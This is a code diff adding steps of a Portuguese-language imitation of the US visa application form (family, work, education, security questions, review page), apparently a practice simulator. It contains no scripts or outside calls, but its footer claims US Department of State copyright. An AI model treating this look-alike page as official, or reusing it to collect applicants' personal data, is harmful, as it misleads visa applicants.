+        </div>
+
+        <!-- Nomes Próprios -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Nomes Próprios:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite os nomes próprios">
+            <div class="mt-2">
+                <input type="checkbox" id="nao-sei-nomes" class="mr-2">
+                <label for="nao-sei-nomes" class="text-gray-700">Não Sei</label>
+            </div>
+        </div>
+
+        <!-- Nome da Organização -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Nome da Organização:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o nome da organização">
+            <div class="mt-2">
+                <input type="checkbox" id="nao-sei-organizacao" class="mr-2">
+                <label for="nao-sei-organizacao" class="text-gray-700">Não Sei</label>
+            </div>
+        </div>
+
+        <!-- Relação com você -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Relação com Você:</label>
+            <select class="mt-2 block w-full border border-gray-300 p-2 rounded">
+                <option value="">- SELECIONE UM -</option>
+                <option value="parente">Parente</option>
+                <option value="amigo">Amigo</option>
+                <option value="negocios">Negócios</option>
+                <option value="outro">Outro</option>
+            </select>
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaOitavaEtapa()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa10()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 10: Informações Familiares - Parentes -->
+    <section id="etapa-10" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações Familiares: Parentes</h2>
+        <p class="mt-4 text-gray-800">Informe os nomes completos e data de nascimento dos seus pais biológicos ou adotivos.</p>
+
+        <!-- Informações do Pai -->
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-700">Informações do Pai</h3>
+            <label class="block text-gray-700">Sobrenomes:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="(ex: Hernandez Garcia)">
+            <div class="mt-2">
+                <input type="checkbox" class="mr-2"> <label class="text-gray-700">Não Sei</label>
+            </div>
+
+            <label class="block text-gray-700 mt-4">Nomes Próprios:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="(ex: Juan Miguel)">
+            <div class="mt-2">
+                <input type="checkbox" class="mr-2"> <label class="text-gray-700">Não Sei</label>
+            </div>
+
+            <label class="block text-gray-700 mt-4">Data de Nascimento:</label>
+            <input type="date" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+            <div class="mt-2">
+                <input type="checkbox" class="mr-2"> <label class="text-gray-700">Não Sei</label>
+            </div>
+
+            <div class="mt-6">
+                <label class="text-gray-700">Seu pai está nos EUA?</label>
+                <div class="mt-2">
+                    <input type="radio" name="pai-eua" class="mr-2"> <label>Sim</label>
+                    <input type="radio" name="pai-eua" class="ml-4 mr-2"> <label>Não</label>
+                </div>
+            </div>
+        </div>
+
+        <!-- Informações da Mãe -->
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-700">Informações da Mãe</h3>
+            <label class="block text-gray-700">Sobrenomes:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="(ex: Hernandez Garcia)">
+            <div class="mt-2">
+                <input type="checkbox" class="mr-2"> <label class="text-gray-700">Não Sei</label>
+            </div>
+
+            <label class="block text-gray-700 mt-4">Nomes Próprios:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="(ex: Maria Luisa)">
+            <div class="mt-2">
+                <input type="checkbox" class="mr-2"> <label class="text-gray-700">Não Sei</label>
+            </div>
+
+            <label class="block text-gray-700 mt-4">Data de Nascimento:</label>
+            <input type="date" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+            <div class="mt-2">
+                <input type="checkbox" class="mr-2"> <label class="text-gray-700">Não Sei</label>
+            </div>
+
+            <div class="mt-6">
+                <label class="text-gray-700">Sua mãe está nos EUA?</label>
+                <div class="mt-2">
+                    <input type="radio" name="mae-eua" class="mr-2"> <label>Sim</label>
+                    <input type="radio" name="mae-eua" class="ml-4 mr-2"> <label>Não</label>
+                </div>
+            </div>
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaNonaEtapa()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa11()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 11: Informações Familiares - Esposa(o) -->
+    <section id="etapa-11" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações Familiares: Esposa(o)</h2>
+        <p class="mt-4 text-gray-800">Preencha as informações da sua esposa (ou esposo), caso seja casado(a).</p>
+
+        <!-- Sobrenomes -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Sobrenomes:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite os sobrenomes">
+            <div class="mt-2">
+                <input type="checkbox" id="nao-sei-sobrenome" class="mr-2">
+                <label for="nao-sei-sobrenome" class="text-gray-700">Não Sei</label>
+            </div>
+        </div>
+
+        <!-- Nomes Próprios -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Nomes Próprios:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite os nomes próprios">
+            <div class="mt-2">
+                <input type="checkbox" id="nao-sei-nomes" class="mr-2">
+                <label for="nao-sei-nomes" class="text-gray-700">Não Sei</label>
+            </div>
+        </div>
+
+        <!-- Data de Nascimento -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Data de Nascimento:</label>
+            <input type="date" class="mt-2 block w-full border border-gray-300 p-2 rounded">
+            <div class="mt-2">
+                <input type="checkbox" id="nao-sei-data" class="mr-2">
+                <label for="nao-sei-data" class="text-gray-700">Não Sei</label>
+            </div>
+        </div>
+
+        <!-- Nacionalidade -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Nacionalidade:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite a nacionalidade">
+        </div>
+
+        <!-- Seu cônjuge está nos EUA -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Seu cônjuge está nos EUA?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-conjuge" name="conjuge-eua" class="mr-2">
+                <label for="sim-conjuge" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-conjuge" name="conjuge-eua" class="ml-4 mr-2">
+                <label for="nao-conjuge" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa10()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa12()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 12: Informações sobre Educação e Trabalho - Parte 1 -->
+    <section id="etapa-12" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Educação e Trabalho: Parte 1</h2>
+        <p class="mt-4 text-gray-800">Informe os detalhes de sua ocupação e formação educacional mais recente.</p>
+
+        <!-- Ocupação Primária -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Ocupação Primária:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite sua ocupação">
+        </div>
+
+        <!-- Nome do Empregador ou Escola -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Nome do Empregador ou Escola:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o nome do empregador ou escola">
+        </div>
+
+        <!-- Endereço do Empregador ou Escola -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Endereço do Empregador ou Escola:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o endereço">
+        </div>
+
+        <!-- Cidade do Empregador ou Escola -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Cidade do Empregador ou Escola:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite a cidade">
+        </div>
+
+        <!-- Estado/Província do Empregador ou Escola -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Estado/Província do Empregador ou Escola:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o estado/província">
+        </div>
+
+        <!-- País do Empregador ou Escola -->
+        <div class="mt-6">
+            <label class="block text-gray-700">País do Empregador ou Escola:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o país">
+        </div>
+
+        <!-- Telefone do Empregador ou Escola -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Telefone do Empregador ou Escola:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o telefone">
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa11()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa13()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 13: Informações sobre Educação e Trabalho - Parte 2 -->
+    <section id="etapa-13" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Educação e Trabalho: Parte 2</h2>
+        <p class="mt-4 text-gray-800">Informe as ocupações anteriores nos últimos 5 anos.</p>
+
+        <!-- Ocupações Anteriores -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você teve ocupações anteriores nos últimos 5 anos?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-ocupacoes" name="ocupacoes" class="mr-2">
+                <label for="sim-ocupacoes" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-ocupacoes" name="ocupacoes" class="ml-4 mr-2">
+                <label for="nao-ocupacoes" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Funções Exercidas -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Descreva as funções exercidas:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Ex: Engenheiro de Software">
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa12()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa14()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 14: Informações sobre Educação e Trabalho - Parte 3 -->
+    <section id="etapa-14" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Educação e Trabalho: Parte 3</h2>
+        <p class="mt-4 text-gray-800">Informe o nível mais alto de educação que você completou.</p>
+
+        <!-- Nível de Educação -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Nível de Educação:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Ex: Ensino Médio Completo">
+        </div>
+
+        <!-- Instituição de Ensino -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Nome da Instituição de Ensino:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o nome da instituição de ensino">
+        </div>
+
+        <!-- Endereço da Instituição de Ensino -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Endereço da Instituição de Ensino:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Digite o endereço">
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa13()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa15()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 15: Informações sobre Idiomas -->
+    <section id="etapa-15" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Idiomas</h2>
+        <p class="mt-4 text-gray-800">Informe os idiomas que você fala.</p>
+
+        <!-- Idiomas -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você fala mais de um idioma?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-idiomas" name="idiomas" class="mr-2">
+                <label for="sim-idiomas" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-idiomas" name="idiomas" class="ml-4 mr-2">
+                <label for="nao-idiomas" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Lista de Idiomas -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Liste os idiomas falados:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Ex: Português, Inglês">
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa14()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa16()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 16: Informações sobre Tecnologia -->
+    <section id="etapa-16" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Tecnologia</h2>
+        <p class="mt-4 text-gray-800">Preencha as informações sobre uso de tecnologias específicas.</p>
+
+        <!-- Tecnologia -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já trabalhou com tecnologia avançada ou desenvolvimento de armas?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-tecnologia" name="tecnologia" class="mr-2">
+                <label for="sim-tecnologia" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-tecnologia" name="tecnologia" class="ml-4 mr-2">
+                <label for="nao-tecnologia" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Lista de Tecnologias -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Se sim, liste as tecnologias:</label>
+            <input type="text" class="mt-2 block w-full border border-gray-300 p-2 rounded" placeholder="Ex: Desenvolvimento de Inteligência Artificial">
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa15()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaDecimaSetimaOitavaNonaEtapa()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapas 17, 18 e 19 combinadas -->
+    <section id="decima-setima-oitava-nona-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Informações sobre Segurança, Antecedentes e Questões Adicionais</h2>
+        <p class="mt-4 text-gray-800">Preencha as informações de segurança, antecedentes e questões adicionais a seguir:</p>
+
+        <!-- Parte da Etapa 17 -->
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-800">Parte 1: Questões de Saúde</h3>
+            <label class="block text-gray-700">Você já foi diagnosticado com alguma doença contagiosa perigosa?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-doenca" name="doenca" class="mr-2">
+                <label for="sim-doenca" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-doenca" name="doenca" class="ml-4 mr-2">
+                <label for="nao-doenca" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Parte da Etapa 17 -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você é ou já foi dependente de drogas?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-drogas" name="drogas" class="mr-2">
+                <label for="sim-drogas" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-drogas" name="drogas" class="ml-4 mr-2">
+                <label for="nao-drogas" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Parte da Etapa 18 -->
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-800">Parte 2: Questões de Segurança</h3>
+            <label class="block text-gray-700">Você já foi preso ou condenado por algum crime?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-crime" name="crime" class="mr-2">
+                <label for="sim-crime" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-crime" name="crime" class="ml-4 mr-2">
+                <label for="nao-crime" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Parte da Etapa 18 -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já esteve envolvido em atividades terroristas?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-terrorismo" name="terrorismo" class="mr-2">
+                <label for="sim-terrorismo" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-terrorismo" name="terrorismo" class="ml-4 mr-2">
+                <label for="nao-terrorismo" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Parte da Etapa 18 -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já participou de genocídios ou tortura?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-genocidio" name="genocidio" class="mr-2">
+                <label for="sim-genocidio" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-genocidio" name="genocidio" class="ml-4 mr-2">
+                <label for="nao-genocidio" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Parte da Etapa 19 -->
+        <div class="mt-6">
+            <h3 class="text-lg font-semibold text-gray-800">Parte 3: Questões Adicionais</h3>
+            <label class="block text-gray-700">Você já tentou obter um visto dos EUA por meios fraudulentos?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-fraude" name="fraude" class="mr-2">
+                <label for="sim-fraude" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-fraude" name="fraude" class="ml-4 mr-2">
+                <label for="nao-fraude" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Parte da Etapa 19 -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já foi deportado ou teve sua entrada recusada nos EUA?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-deportacao" name="deportacao" class="mr-2">
+                <label for="sim-deportacao" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-deportacao" name="deportacao" class="ml-4 mr-2">
+                <label for="nao-deportacao" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Parte da Etapa 19 -->
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já fez parte de atividades militares ou paramilitares?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-militar" name="militar" class="mr-2">
+                <label for="sim-militar" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-militar" name="militar" class="ml-4 mr-2">
+                <label for="nao-militar" class="text-gray-700">Não</label>
+            </div>
+        </div>
+
+        <!-- Botões de Navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa16()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa20()">Salvar e Finalizar</button>
+        </div>
+    </section>
+
+    <!-- Vigésima Etapa -->
+    <section id="vigesima-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-blue-900">Segurança e Antecedentes: Parte 4</h2>
+        <p class="mt-4 text-gray-800 leading-relaxed">
+            Forneça as seguintes informações de segurança e antecedentes. Responda a todas as perguntas que exigem explicação. Um visto pode não ser emitido para pessoas que estão em categorias específicas definidas por lei como inadmissíveis nos Estados Unidos (exceto quando uma dispensa é obtida com antecedência). 
+            Se alguma das perguntas abaixo for aplicável a você, poderá ser necessário comparecer pessoalmente perante um oficial consular.
+        </p>
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já reteve a custódia de um filho cidadão dos EUA fora dos Estados Unidos de uma pessoa com custódia legal concedida por um tribunal dos EUA?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-custodia" name="custodia" class="mr-2">
+                <label for="sim-custodia" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-custodia" name="custodia" class="ml-4 mr-2">
+                <label for="nao-custodia" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já votou nos Estados Unidos em violação de qualquer lei ou regulamento?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-votou" name="votou" class="mr-2">
+                <label for="sim-votou" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-votou" name="votou" class="ml-4 mr-2">
+                <label for="nao-votou" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        <div class="mt-6">
+            <label class="block text-gray-700">Você já renunciou �&nbsp; cidadania dos Estados Unidos para evitar impostos?</label>
+            <div class="mt-2">
+                <input type="radio" id="sim-renunciou" name="renunciou" class="mr-2">
+                <label for="sim-renunciou" class="text-gray-700">Sim</label>
+                <input type="radio" id="nao-renunciou" name="renunciou" class="ml-4 mr-2">
+                <label for="nao-renunciou" class="text-gray-700">Não</label>
+            </div>
+        </div>
+        
+        <!-- Botões de navegação -->
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaDecimaSetimaOitavaNonaEtapa()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="irParaEtapa21()">Salvar e Continuar</button>
+        </div>
+    </section>
+
+    <!-- Etapa 21: Revisão de Informações Pessoais -->
+    <section id="vigesima-primeira-etapa" class="container mx-auto my-6 p-6 bg-white rounded shadow-lg hidden">
+        <h2 class="text-xl font-bold text-center mb-6">Informações Pessoais, Endereço, Telefone</h2>
+        <p class="mb-4 text-sm text-gray-600">
+            Nota: Você completou a entrada de dados para sua solicitação de visto. Antes de enviar a solicitação, revise suas informações abaixo. 
+            Para navegar para a próxima seção a ser revisada, clique no botão "Próximo" na parte inferior da página.
+        </p>
+
+        <div class="flex items-center justify-center mb-6">
+            <div class="border-2 border-gray-300 p-4">
+                <img src="images/foto3x4.png" alt="Simulação da Foto no ASC" class="h-auto w-auto object-cover">
+                <p class="text-center text-lg font-bold mt-4"></p>
+            </div>
+        </div>
+
+        <div class="border-t border-gray-200 py-4">
+            <div class="grid grid-cols-2 gap-4">
+                <div class="font-semibold">Sobrenomes:</div>
+                <div id="sobrenomes-revisao">Não fornecido</div>
+    
+                <div class="font-semibold">Nome(s) Dados:</div>
+                <div id="nomes-dados-revisao">Não fornecido</div>
+    
+                <div class="font-semibold">Endereço:</div>
+                <div id="endereco-revisao">Não fornecido</div>
+    
+                <div class="font-semibold">Telefone:</div>
+                <div id="telefone-revisao">Não fornecido</div>
+    
+                <div class="font-semibold">Gênero:</div>
+                <div id="genero-revisao">Não fornecido</div>
+            </div>
+        </div>
+    
+        <div class="mt-6 flex justify-between">
+            <button class="bg-red-600 text-white px-4 py-2 rounded" onclick="voltarParaEtapa20()">Voltar</button>
+            <button class="bg-blue-900 text-white px-4 py-2 rounded" onclick="enviarSolicitacao()">Enviar Solicitação</button>
+        </div>
+    </section>
+
+<!-- Footer Section -->
+<footer class="bg-blue-900 text-white p-4 mt-6">
+    <div class="container mx-auto text-center">
+        <a href="#" class="underline">Informações de Copyright</a> |
+        <a href="#" class="underline">Isenções de Responsabilidade</a> |
+        <a href="#" class="underline">Lei de Redução de Burocracia</a> |
+        <a href="#" class="underline">Política de Privacidade do FBI</a>
+        <p class="mt-2">© 2024 - Departamento de Estado dos EUA</p>
+    </div>
+</footer>
+
+</body></html>
